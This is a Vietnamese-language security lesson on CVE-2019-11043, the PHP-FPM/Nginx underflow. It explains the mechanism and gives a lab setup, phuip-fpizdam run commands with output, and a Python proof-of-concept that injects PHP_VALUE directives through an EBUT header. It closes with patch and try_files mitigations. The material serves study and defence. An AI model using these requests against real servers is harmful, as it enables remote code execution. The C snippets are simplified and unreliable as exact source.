---
title: "20. PHP-FPM/Nginx Underflow — CVE-2019-11043"
tags: [security, cve, landmark-cves, php-fpm, nginx, buffer-underflow, rce, fastcgi, lesson-20]
aliases: [PHP-FPM Underflow, CVE-2019-11043, phuip-fpizdam]
created: 2026-03-24
---

> **Prerequisites**: [[01-memory-model-exploit-primitives|01. Memory Model & Exploit Primitives]], FastCGI/PHP-FPM basics, Nginx configuration basics
> **Objectives**:
> - Hiểu Nginx `fastcgi_split_path_info` regex và tại sao newline `%0a` phá vỡ nó
> - Hiểu `_fcgi_data_seg` structure và buffer underflow trong `fpm_main.c`
> - Trace cơ chế: `PATH_INFO` empty → `env_path_info` underflow → overwrite `pos` LSB → inject `PHP_VALUE`
> - Hiểu hash collision trick: `HTTP_EBUT` có cùng hash và length với `PHP_VALUE`
> - Hiểu cách `phuip-fpizdam` tự động tìm `qsl` (query string length) để align buffer
> - Dựng vulnerable lab và chạy exploit
> - Phân biệt với memory corruption bugs khác trong series này

---

## Bối Cảnh: Bug Lai Giữa Web và Binary

CVE-2019-11043 được công bố tháng 10/2019 bởi Emil Lerner, và exploit Go được viết bởi neex (trình bày tại ZeroNights 2019). Orange Tsai sau đó phân tích sâu và tìm cách cải thiện reliability.

Điều đặc biệt khiến bug này nổi bật: đây là **buffer underflow** (lỗi binary/memory) nhưng được trigger hoàn toàn qua **HTTP request** và cho phép inject PHP ini directives — một hybrid giữa web exploitation và binary exploitation.

Điều kiện khai thác:
- Nginx với `fastcgi_split_path_info` directive
- PHP-FPM 7.1.x < 7.1.33, 7.2.x < 7.2.24, hoặc 7.3.x < 7.3.11
- Không có `try_files` hay file existence check
- `PATH_INFO` được set từ `$fastcgi_path_info`

---

## Nginx `fastcgi_split_path_info` và Điểm Lỗi

### Cấu hình Nginx vulnerable

```nginx
# Nginx config — vulnerable pattern (common on many tutorials/wikis)
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    fastcgi_param PATH_INFO       $fastcgi_path_info;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass  php-fpm:9000;
    include       fastcgi_params;
    # THIẾU: try_files $uri =404;  ← bảo vệ quan trọng bị bỏ qua
}
```

Regex `^(.+?\.php)(/.*)$` có hai capture groups:
- Group 1: phần script (`.php`)
- Group 2: phần path info (phần sau `.php`)

### Newline phá vỡ regex

Regex này không match newline character (`\n`). Nếu URI chứa `%0a` (URL-encoded `\n`):

```text
URI bình thường:
  GET /index.php/something HTTP/1.1
  → $fastcgi_script_name = /index.php
  → $fastcgi_path_info   = /something     ← GROUP 2 match

URI với newline:
  GET /index.php%0aXXX HTTP/1.1
  → fastcgi_split_path_info regex FAIL (newline không match .*)
  → $fastcgi_path_info = ""               ← EMPTY string!
```

Khi `$fastcgi_path_info` empty, `PATH_INFO` được set thành empty string và pass xuống PHP-FPM.

---

## `_fcgi_data_seg` Structure và Buffer Underflow

### FastCGI data storage trong PHP-FPM

PHP-FPM nhận environment variables từ Nginx qua FastCGI protocol và lưu chúng trong một hash table. Strings được store trong `_fcgi_data_seg` buffers:

```c
/* sapi/fpm/fpm/fpm_main.c — _fcgi_data_seg structure */
typedef struct _fcgi_data_seg {
    char  *pos;                /* con trỏ đến vị trí tiếp theo có thể ghi */
    char  *end;                /* cuối buffer */
    struct _fcgi_data_seg *next; /* next buffer nếu đây đầy */
    char   data[1];            /* actual string data bắt đầu từ đây */
} fcgi_data_seg;
```

`pos` là write pointer — mỗi khi PHP-FPM nhận một environment variable mới, nó ghi string vào `data[pos]` rồi advance `pos`.

### Tại sao PATH_INFO empty gây underflow?

Trong `fpm_main.c`, có đoạn code xử lý `PATH_INFO`:

```c
/* fpm_main.c — logic tính path_info (simplified) */
path_info = fcgi_getenv(request, "PATH_INFO", sizeof("PATH_INFO")-1);

if (path_info) {
    /* env_path_info = con trỏ đến vị trí của PATH_INFO trong buffer */
    env_path_info = SG(request_info).path_translated - path_info_len;
    /* slen = strlen(script_path) - strlen(path_info) */
    /* pilen = strlen(path_info) */
    /* ... */
}
```

Khi `PATH_INFO` = empty string (`""`):
- `path_info_len = 0`
- `env_path_info = path_translated - 0 = path_translated`

Nhưng sau đó code tính:

```c
/* BUG: nếu path_info empty, tính toán này sai */
path_info = env_path_info + slen;
/* env_path_info + slen có thể trỏ VỀ TRƯỚC đầu buffer! */
/* → BUFFER UNDERFLOW */
```

> [!definition] Definition 20.1 — Buffer Underflow
> **Buffer underflow** (hay **buffer backward overflow**): con trỏ `pos` bị đặt về vị trí **trước đầu buffer** (`data[0]`). Khi PHP-FPM tiếp tục ghi data vào `pos`, nó ghi vào vùng nhớ nằm **trước** `_fcgi_data_seg.data` — tức là overwrite các field của struct như `pos`, `end`, `next`.
>
> Đây là ngược lại với buffer overflow thông thường (ghi vượt qua cuối buffer).

---

## Hash Collision Trick — `HTTP_EBUT` = `PHP_VALUE`

### Vấn đề: cần ghi PHP_VALUE

PHP cho phép override PHP ini settings qua FastCGI environment variable `PHP_VALUE`. Ví dụ:

```text
PHP_VALUE = "auto_prepend_file=/etc/passwd"
→ PHP sẽ include /etc/passwd trước mỗi script
```

Nhưng để inject `PHP_VALUE`, cần biết chính xác địa chỉ của nó trong buffer để overwrite.

### Hash collision giải quyết vấn đề

FastCGI hash table tra cứu environment variables theo:
1. **Hash value** của key name
2. **Length** của key name

Researcher neex phát hiện: `HTTP_EBUT` có **cùng hash value và length** với `PHP_VALUE` trong FastCGI's implementation.

Điều này có nghĩa: khi attacker gửi HTTP header `EBUT: value`, PHP-FPM lưu `HTTP_EBUT=value` vào hash table tại **đúng slot** mà `PHP_VALUE` sẽ được lưu.

Exploit flow:

```text
1. Trigger buffer underflow → pos trỏ về trước buffer
2. Ghi HTTP headers (tiếp theo sau PATH_INFO trong buffer)
3. HTTP header "EBUT: auto_prepend_file=/etc/passwd"
   → được lưu vào slot của PHP_VALUE (do hash collision)
4. PHP-FPM execute script với PHP_VALUE chứa attacker's directive
5. PHP auto-prepend file → code execution!
```

---

## Cách phuip-fpizdam Hoạt Động

Tool exploit `phuip-fpizdam` (neex) tự động tìm query string length tối ưu:

```text
BƯỚC 1: Tìm QSL (Query String Length) để trigger underflow

  Tool gửi nhiều request với QUERY_STRING có độ dài khác nhau:
  GET /index.php%0aAAAAAAAA...?AAAA...  (Q bytes)

  Mục tiêu: tìm Q sao cho sau khi PATH_INFO empty trigger underflow,
  việc ghi HTTP_EBUT sẽ overwrite đúng vị trí PHP_VALUE.

BƯỚC 2: Test với PHP ini injection

  Sau khi tìm được Q, inject:
  GET /index.php%0a?AAAA...  (Q bytes)
  Header: EBUT: auto_prepend_file=/etc/passwd

  Nếu response chứa nội dung /etc/passwd → exploit thành công

BƯỚC 3: Lặp để "infect" tất cả PHP-FPM workers

  PHP-FPM có nhiều worker processes. Chỉ một worker bị affected tại một thời điểm.
  Tool gửi nhiều request cho đến khi đủ workers bị inject.
```

---

## Lab Setup & Exploit

### Dựng vulnerable environment

```bash
# Dùng vulhub
git clone https://github.com/vulhub/vulhub
cd vulhub/php/CVE-2019-11043
docker-compose up -d

# Hoặc manual Docker:
docker run -d --name php-fpm-vuln \
    -p 8080:80 \
    vulhub/php-fpm:7.3.6-cve-2019-11043

# Verify PHP version
curl http://localhost:8080/index.php
```

### Vulnerable Nginx config (reference)

```nginx
server {
    listen 80;
    root /var/www/html;

    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        fastcgi_param PATH_INFO       $fastcgi_path_info;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_pass  127.0.0.1:9000;

        include fastcgi_params;
        # try_files $uri =404;   ← THIẾU DÒNG NÀY → VULNERABLE
    }
}
```

### Chạy exploit

```bash
# Install Go và build phuip-fpizdam
sudo snap install go --classic
git clone https://github.com/neex/phuip-fpizdam
cd phuip-fpizdam && go build

# Test và exploit
./phuip-fpizdam http://localhost:8080/index.php
```

Output khi thành công:

```text
2019/11/02 08:44:50 Going to attack http://localhost:8080/index.php
2019/11/02 08:44:50 Trying to find QSL candidate with random path (/a.php)
2019/11/02 08:44:50 None of candidates worked, trying it with the actual path
2019/11/02 08:44:50 Found valid QSL with path /index.php: 1787
2019/11/02 08:44:50 Detected FCGI buffer size: 2048
2019/11/02 08:44:50 Trying to infect via PHP_VALUE...
2019/11/02 08:44:51 Payload was delivered via env_path_info underflow!
2019/11/02 08:44:51 Trying to confirm the infection...
2019/11/02 08:44:53 QSL candidate: 1787 infected/2 total  ← workers infected
...
2019/11/02 08:44:55 Exploited successfully, check /tmp/pwned
```

### Python PoC — Phiên bản đơn giản

```python
import requests

TARGET  = "http://localhost:8080/index.php"
# Minh họa trigger mechanism (phuip-fpizdam tự động tìm QSL)

def test_vulnerability(target):
    """Test xem server có vulnerable không."""
    # Gửi request với %0a trong URL
    test_url = target.replace(".php", ".php%0atest")
    resp = requests.get(test_url, timeout=5)
    # Nếu server xử lý được thay vì 404/403 → có thể vulnerable
    print(f"[*] %0a test response: {resp.status_code}")
    if resp.status_code == 200:
        print("[?] Server responds to %0a path — may be vulnerable")
    return resp.status_code

def inject_php_value(target, qsl, php_ini_directive):
    """
    Inject PHP_VALUE directive via HTTP_EBUT hash collision.
    qsl: query string length (tìm bởi phuip-fpizdam)
    php_ini_directive: VD 'auto_prepend_file=/etc/passwd'
    """
    padding = "A" * qsl
    # URL: /index.php%0a?AAAA...
    url = target.replace(".php", f".php%0a") + f"?{padding}"
    headers = {
        # EBUT has same hash+length as PHP_VALUE in FastCGI
        "EBUT": php_ini_directive,
    }
    resp = requests.get(url, headers=headers, timeout=5)
    return resp.text

print("=== CVE-2019-11043 PHP-FPM vulnerability ===")
print("[!] Use phuip-fpizdam for reliable exploitation.")
print("[!] This Python version is for educational/analysis only.")
print()
test_vulnerability(TARGET)
print()
print("[*] Exploit requires phuip-fpizdam for automatic QSL detection.")
print(f"    Run: ./phuip-fpizdam {TARGET}")
```

---

## Điều Kiện Khai Thác — Checklist

```text
PHẢI CÓ TẤT CẢ:
  ✓ Nginx làm reverse proxy trước PHP-FPM
  ✓ location block forward .php đến PHP-FPM
  ✓ fastcgi_split_path_info với regex bắt đầu ^ kết thúc $
  ✓ fastcgi_param PATH_INFO $fastcgi_path_info
  ✓ PHP-FPM 7.1.x < 7.1.33, 7.2.x < 7.2.24, hoặc 7.3.x < 7.3.11
  ✓ KHÔNG có try_files $uri =404 hay if (-f $uri)

KHÔNG BỊ ẢNH HƯỞNG:
  ✗ Apache + mod_php (không dùng fastcgi_split_path_info)
  ✗ Nginx với try_files check
  ✗ PHP 7.1.33+, 7.2.24+, 7.3.11+, tất cả PHP 8.x
  ✗ Nginx + PHP-FPM không có fastcgi_split_path_info directive
```

---

## Patch và Mitigation

### Patch PHP-FPM (official fix)

```bash
# Upgrade PHP
sudo apt-get update && sudo apt-get install php7.3

# Verify: PHP 7.3.11+ là safe
php --version
```

Patch trong `fpm_main.c`: thêm bounds check — nếu `path_info` empty, skip pointer arithmetic thay vì tính sai địa chỉ.

```c
/* After patch in fpm_main.c */
if (path_info && path_info_len > 0) {
    /* chỉ tính toán khi path_info không empty */
    env_path_info = SG(request_info).path_translated - path_info_len;
    /* ... */
}
```

### Nginx mitigation (không cần patch PHP)

```nginx
# Thêm một trong hai dòng này:
try_files $uri =404;
# HOẶC
if (!-f $fastcgi_script_name) { return 404; }
```

Khi có `try_files`, Nginx kiểm tra file tồn tại trước khi forward đến PHP-FPM. Nếu `/index.php%0aXXX` không tồn tại → 404 → request không đến PHP-FPM.

---

## Bài Học Bảo Mật

CVE-2019-11043 là ví dụ xuất sắc về **configuration-induced vulnerabilities**:

- PHP-FPM bản thân không có bug trong cấu hình mặc định
- Nginx bản thân không có bug
- Lỗi xuất hiện **ở sự kết hợp của một pattern config cụ thể** phổ biến trên StackOverflow và wiki

Nhiều developer copy-paste Nginx config từ các nguồn trực tuyến mà không hiểu `try_files` là bảo vệ quan trọng, không phải optional.

---

## Summary

- Nginx `fastcgi_split_path_info` regex không match `\n` → `%0a` trong URL làm `$fastcgi_path_info` empty
- PHP-FPM nhận `PATH_INFO=""` → pointer arithmetic sai → `env_path_info` underflow (trỏ trước buffer)
- `_fcgi_data_seg.pos` bị overwrite với null byte → PHP-FPM ghi vào vùng nhớ sai
- `HTTP_EBUT` có cùng hash+length với `PHP_VALUE` → inject PHP ini directive (VD `auto_prepend_file`)
- phuip-fpizdam tự động tìm QSL để align buffer → reliable exploit
- Điều kiện: Nginx + PHP-FPM 7.1-7.3 unpatched + `fastcgi_split_path_info` + thiếu `try_files`
- Fix: patch PHP-FPM lên 7.3.11+ HOẶC thêm `try_files $uri =404` vào Nginx config

---

## References

- neex/phuip-fpizdam (original Go exploit): https://github.com/neex/phuip-fpizdam
- Orange Tsai deep analysis: https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html
- lindemer Python reimplementation: https://github.com/lindemer/CVE-2019-11043
- PHP bug report #78599: https://bugs.php.net/bug.php?id=78599
- PHP patch commit: https://github.com/php/php-src/commit/ab061f95ca96
- Qualys analysis: https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043
- vulhub lab: https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043
